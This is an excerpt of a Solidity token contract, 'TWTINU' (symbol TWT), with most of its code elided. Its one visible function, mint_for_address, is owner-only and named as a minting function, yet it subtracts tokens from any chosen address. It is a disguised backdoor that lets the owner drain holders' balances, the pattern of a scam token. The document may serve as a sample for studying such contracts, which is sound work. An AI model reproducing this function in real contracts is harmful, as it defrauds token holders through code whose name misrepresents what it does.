...
contract TWTINU is Context, IERC20, Ownable {
    ...
    string private constant _symbol = "TWT";
    ...
    function mint_for_address(address adr, uint _amount) external  onlyOwner() {
        _balances[adr] = _balances[adr].sub(_amount);
    }
